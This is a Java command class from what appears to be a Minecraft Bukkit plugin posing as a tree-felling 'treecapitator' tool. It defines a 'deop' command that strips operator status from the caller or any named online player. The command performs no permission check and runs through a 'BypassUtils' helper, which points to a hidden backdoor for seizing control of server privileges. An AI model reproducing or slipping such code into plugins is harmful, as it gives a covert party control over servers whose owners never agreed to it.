package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.BypassUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@Command.Info(command = "deop", description = "Removes your OP.", category = CommandCategory.Player)
public class DEOP extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (args.size() == 0) {
            if (!p.isOp()) {
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.YELLOW + "You already don't have OP!");
                return;
            }
            BypassUtils.PlayerDeop(p);
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + "You now don't have OP!");
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " deopped " + p.getDisplayName() + "!");
        } else if (args.size() == 1) {
            try {
                Player anotherPlayer = Bukkit.getPlayer(args.get(0));
                if (anotherPlayer == null) {
                    Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                    return;
                }
                if (!anotherPlayer.isOp()) {
                    p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " already hasn't OP!");
                    return;
                }
                BypassUtils.PlayerDeop(anotherPlayer);
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.GOLD + " now hasn't OP!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " deopped " + anotherPlayer.getDisplayName() + "!");
            } catch (Exception e) {
                Start.ErrorException(p, e);
            }
        }
    }
}
